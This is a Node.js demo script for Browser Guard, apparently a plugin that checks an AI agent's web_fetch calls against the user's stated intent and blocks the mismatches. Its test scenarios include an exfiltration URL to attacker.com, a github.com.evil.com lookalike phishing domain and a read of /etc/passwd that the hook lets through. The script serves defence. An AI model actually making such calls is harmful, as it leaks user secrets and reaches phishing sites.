#!/usr/bin/env node
/**
 * OpenClaw Integration Demo
 * 
 * Shows how Browser Guard intercepts and validates web_fetch calls.
 */

import {
  WebFetchGuard,
  createWebFetchHook,
} from '../dist/index.js';

const GREEN = '\x1b[32m';
const RED = '\x1b[31m';
const YELLOW = '\x1b[33m';
const BLUE = '\x1b[34m';
const RESET = '\x1b[0m';

console.log('🛡️  Browser Guard + OpenClaw Integration Demo\n');

// Simulate OpenClaw's web_fetch tool call
function simulateToolCall(tool, params, context) {
  return { tool, params, context };
}

// Create a guard and hook for each scenario (simulating per-session guards)
function createHookForContext(userRequest) {
  const guard = new WebFetchGuard({
    mode: 'block',
    stripCookies: true,
  });
  guard.setIntentFromRequest(userRequest);
  return createWebFetchHook(guard);
}

// Test scenarios
const scenarios = [
  {
    name: 'Legitimate weather fetch',
    context: { userRequest: 'Get weather from https://wttr.in' },
    params: { url: 'https://wttr.in/Seattle' },
    shouldAllow: true,
  },
  {
    name: 'Exfiltration attempt to attacker',
    context: { userRequest: 'Get weather from https://wttr.in' },
    params: { url: 'https://attacker.com/steal?data=secret' },
    shouldAllow: false,
  },
  {
    name: 'GitHub API (related domain)',
    context: { userRequest: 'Check my repos on https://github.com' },
    params: { url: 'https://api.github.com/user/repos' },
    shouldAllow: true,
  },
  {
    name: 'Lookalike domain attack',
    context: { userRequest: 'Check my repos on https://github.com' },
    params: { url: 'https://github.com.evil.com/phish' },
    shouldAllow: false,
  },
  {
    name: 'Different tool (not web_fetch)',
    context: { userRequest: 'Read a file' },
    params: { path: '/etc/passwd' },
    tool: 'read',
    shouldAllow: true, // Hook only intercepts web_fetch
  },
];

console.log('Simulating tool calls through Browser Guard hook:\n');

for (const scenario of scenarios) {
  const toolCall = simulateToolCall(
    scenario.tool || 'web_fetch',
    scenario.params,
    scenario.context
  );
  
  // Create a hook with the context's user request
  const hook = createHookForContext(scenario.context.userRequest);
  const decision = await hook(toolCall);
  const allowed = decision.allow;
  const pass = allowed === scenario.shouldAllow;
  
  const icon = pass ? '✓' : '✗';
  const color = pass ? GREEN : RED;
  const status = allowed ? 'ALLOWED' : 'BLOCKED';
  const reason = decision.reason || '';
  
  console.log(`${color}${icon}${RESET} ${scenario.name}`);
  console.log(`  Tool: ${toolCall.tool}`);
  console.log(`  URL: ${scenario.params.url || scenario.params.path}`);
  console.log(`  Status: ${allowed ? GREEN : RED}${status}${RESET}${reason ? ` (${reason})` : ''}`);
  console.log(`  Expected: ${scenario.shouldAllow ? 'ALLOWED' : 'BLOCKED'}`);
  console.log();
}

console.log('='.repeat(50));
console.log('\nTo use Browser Guard as an OpenClaw plugin:');
console.log(`
1. Add to your OpenClaw config:
   
   plugins:
     entries:
       browser-guard:
         enabled: true
         config:
           mode: block
           stripCookies: true

2. The plugin hooks into web_fetch and browser tools
3. All requests are validated against the current intent
4. Blocked requests return an error instead of fetching
`);
